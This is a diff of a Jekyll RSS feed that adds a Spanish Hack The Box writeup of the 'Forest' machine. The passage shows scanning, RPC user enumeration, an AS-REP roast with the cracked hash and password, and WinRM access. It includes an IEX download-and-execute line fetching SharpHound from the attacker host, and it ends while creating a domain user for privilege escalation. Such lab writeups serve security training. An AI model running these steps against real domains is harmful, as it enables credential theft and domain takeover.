@@ -5,9 +5,592 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 26 Aug 2023 01:40:32 +0000</pubDate>
-    <lastBuildDate>Sat, 26 Aug 2023 01:40:32 +0000</lastBuildDate>
-    <generator>Jekyll v3.9.0</generator>
+    <pubDate>Wed, 11 Oct 2023 18:24:16 -0500</pubDate>
+    <lastBuildDate>Wed, 11 Oct 2023 18:24:16 -0500</lastBuildDate>
+    <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>Maquina Forest - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Forest&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad facil, en esta ocasión vamos a enfrentarnos contra un &lt;code&gt;DC&lt;/code&gt; donde enumeraremos usuarios a traves de &lt;code&gt;rpc&lt;/code&gt; y mediante un &lt;code&gt;As-RepRoast attack&lt;/code&gt; solicitando un &lt;code&gt;TGT&lt;/code&gt; obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por &lt;code&gt;winrm&lt;/code&gt; a el equipo; despues enumerando el sistema con &lt;code&gt;Bloodhound&lt;/code&gt; nos aprovecharemos de los permisos del grupo &lt;code&gt;Account Operators&lt;/code&gt; para crear un usuario en el dominio y efectuar un &lt;code&gt;Dcsync attack&lt;/code&gt; donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Forest
+❯ ls
+
+ Forest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.161
+PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
+64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=113 ms
+
+--- 10.10.10.161 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 113.161/113.161/113.161/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-09 11:56 -05
+Initiating SYN Stealth Scan at 11:56
+Scanning 10.10.10.161 [65535 ports]
+Nmap scan report for 10.10.10.161
+Host is up, received user-set (0.12s latency).
+Scanned at 2023-10-09 11:56:58 -05 for 21s
+Not shown: 65290 closed tcp ports (reset), 221 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49677/tcp open  unknown          syn-ack ttl 127
+49684/tcp open  unknown          syn-ack ttl 127
+49706/tcp open  unknown          syn-ack ttl 127
+49934/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds
+           Raw packets sent: 104093 (4.580MB) | Rcvd: 86582 (3.463MB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;# Nmap 7.93 scan initiated Mon Oct  9 11:58:50 2023 as: nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49934 -oN targeted 10.10.10.161
+Nmap scan report for 10.10.10.161
+Host is up (0.22s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 17:05:41Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49706/tcp open  msrpc        Microsoft Windows RPC
+49934/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2023-10-09T10:06:39-07:00
+| smb2-time: 
+|   date: 2023-10-09T17:06:35
+|_  start_date: 2023-10-09T14:03:53
+|_clock-skew: mean: 2h26m44s, deviation: 4h02m32s, median: 6m42s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Oct  9 12:00:09 2023 -- 1 IP address (1 host up) scanned in 78.92 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;53&lt;/td&gt;
+      &lt;td&gt;DNS&lt;/td&gt;
+      &lt;td&gt;Simple DNS Plus&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;88&lt;/td&gt;
+      &lt;td&gt;KERBEROS&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;135&lt;/td&gt;
+      &lt;td&gt;MSRPC&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;139&lt;/td&gt;
+      &lt;td&gt;NETBIOS&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;389&lt;/td&gt;
+      &lt;td&gt;LDAP&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;445&lt;/td&gt;
+      &lt;td&gt;SMB&lt;/td&gt;
+      &lt;td&gt;Windows Server 2016 Standard&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;3268&lt;/td&gt;
+      &lt;td&gt;LDAP&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5985&lt;/td&gt;
+      &lt;td&gt;WINRM&lt;/td&gt;
+      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Como vemos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto, con &lt;code&gt;crackpamexec&lt;/code&gt; podemos tratar de enumerar a lo que nos enfrentamos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.161
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que nos enfrentamos a un &lt;code&gt;Windows Server 2016&lt;/code&gt; y que el &lt;code&gt;smb&lt;/code&gt; esta firmado, ahora bien vamos a proceder a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.161 htb.local&quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora al tratarse de un &lt;code&gt;Domain Controller&lt;/code&gt; podemos tratar de enumerar usuarios validos con &lt;code&gt;rpclient&lt;/code&gt; a traves de un &lt;code&gt;null session&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'
+Administrator
+Guest
+krbtgt
+DefaultAccount
+$331000-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+SM_681f53d4942840e18
+SM_1b41c9286325456bb
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailbox83d6781
+HealthMailboxfd87238
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como tenemos un listado potencial de usuarios, podemos tratar de efectuar un &lt;code&gt;ASREProast Attack&lt;/code&gt; para tratar de obtener un &lt;code&gt;TGT - ticket granting ticket&lt;/code&gt; que basicamente se traduce a un hash que podemos tratar de crackear. Para ello vamos a exportar los usuarios obtenidos en un archivo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py -no-pass -usersfile users htb.local/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:7d76b9feda1646146b12dce5ca4b85bb$a6cf183aa4803f1d4e54123a24516e4e6468c484ae6735370d270e74ff7a09f9a0fcc28abfe3e79f3c3995693abdcb9009043f2a6f941780e8b028b68f0d6727b269f4f7eb0939fb049ed9103c1bf81c9b707fbf20acddd0166ff1fe591c0f8c38115ce7696a9a2c62787cad92c6fc8130ef0ab36e40f8512caf4b2896860a60c87ec78611aa67cf8bf0c570530974ee8e2f090e5979aa7387a34d4456688a9a08e71c79714e341b4bed2f120836a3a95831f462da15bec11d56c6a1445be3db49a32f0751c00b73df61a4558d3c0bc5187f3df9fef3c7824ed43ae7baa22682450724dcc52b
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procedemos a crackear el hash y obtenemos unas credenciales &lt;code&gt;svc-alfresco:s3rvice&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
+1g 0:00:00:06 DONE (2023-10-11 14:27) 0.1510g/s 617184p/s 617184c/s 617184C/s s521379846..s3r2s1
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Validamos las credenciales y como el puerto &lt;code&gt;5985&lt;/code&gt; se encuentra abierto podemos tratar de conectarnos por &lt;code&gt;winrm&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
+SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
+HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos conectamos al servicio, despues nos dirigimos al directorio personal del usuario &lt;code&gt;svc-alfresco&lt;/code&gt; y podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; whoami
+htb\svc-alfresco
+Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; cd ..\Desktop
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; type user.txt
+a5bdfec1b06f0a66536a4227d3dfc27d
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Como nos enfrentamos a un &lt;code&gt;DC&lt;/code&gt; vamos a usar &lt;code&gt;BloodHound&lt;/code&gt; para tratar de enumerar vias potenciales para elevar nuestros privilegios.&lt;/p&gt;
+
+&lt;p&gt;Para instalarlos solo debemos ejecutar:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;apt install neo4j, bloodhound -y
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si tienes problemas con la instalación puedes instalar una versión especifica de &lt;code&gt;neo4j&lt;/code&gt; de:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://debian.neo4j.com/&quot;&gt;https://debian.neo4j.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;y puedes descargar un release de &lt;code&gt;bloodhound&lt;/code&gt; directamente del repositorio de github:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases&quot;&gt;https://github.com/BloodHoundAD/BloodHound/releases&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Una vez instalado ejecuta el comando &lt;code&gt;neo4j console&lt;/code&gt; y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto &lt;code&gt;neo4j:no4oj&lt;/code&gt; y te pedira cambies la contraseña por defecto a la que desees.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ neo4j console
+Starting Neo4j.
+2023-10-11 20:21:29.970+0000 INFO  Starting...
+2023-10-11 20:21:30.757+0000 INFO  This instance is ServerId{379de84c} (379de84c-82dc-4a72-beab-b327d0181e30)
+2023-10-11 20:21:33.391+0000 INFO  ======== Neo4j 4.4.26 ========
+2023-10-11 20:21:36.106+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
+2023-10-11 20:21:36.659+0000 INFO  Bolt enabled on localhost:7687.
+2023-10-11 20:21:37.946+0000 INFO  Remote interface available at http://localhost:7474/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Estas credenciales seran la que usaras para logearte al abrir &lt;code&gt;Bloodhound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora descargaremos el script de powershell &lt;code&gt;sharphound.ps1&lt;/code&gt; que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Subimos el script y lo interpretamos con &lt;code&gt;Iex&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; mkdir bloodhound
+
+    Directory: C:\Users\svc-alfresco\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/11/2023   2:46 PM                bloodhound
+
+
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; cd bloodhound
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/SharpHound.ps1')
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Invoke-BloodHound -CollectionMethod All
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; dir
+
+    Directory: C:\Users\svc-alfresco\Desktop\bloodhound
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/11/2023   2:48 PM          15433 20231011144852_BloodHound.zip
+-a----       10/11/2023   2:48 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos traemos el archivo a nuestro equipo y lo importamos en el &lt;code&gt;Bloodhound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; download C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip
+                                        
+Info: Downloading C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip to 20231011144852_BloodHound.zip
+                                        
+Info: Download successful!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Le asignamos un nombre mas descriptivo al comprimido.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
+ 20231011144852_BloodHound.zip   hash   SharpHound.ps1   users
+❯ mv 20231011144852_BloodHound.zip bh_data.zip
+❯ ls
+ bh_data.zip   hash   SharpHound.ps1   users
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora lo subimos al &lt;code&gt;BloodHound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como comprometimos al usuario &lt;code&gt;svc-alfresco&lt;/code&gt; vamos a marcarlo como comprometido.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el usuario alfresco esta dentro del grupo &lt;code&gt;Account Operators&lt;/code&gt; y este tiene el privilegio &lt;code&gt;GenericAll&lt;/code&gt; sobre &lt;code&gt;Exchange Windows Permissions&lt;/code&gt;, que a su vez tiene &lt;code&gt;WriteDacl&lt;/code&gt; sobre &lt;code&gt;htb.local&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Estando dentro del grupo &lt;code&gt;Account Operators&lt;/code&gt; podemos crear un usuario e incorporarlo en nuevos grupos. Por lo que vamos a crear un usuario y lo agregaremos al grupo &lt;code&gt;Exchange Windows Permissions&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net user fmiracle fmiracle123$! /add /domain
+The command completed successfully.
+
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net group &quot;Exchange Windows Permissions&quot; fmiracle /add
+The command completed successfully.
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net user fmiracle
+User name                    fmiracle
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
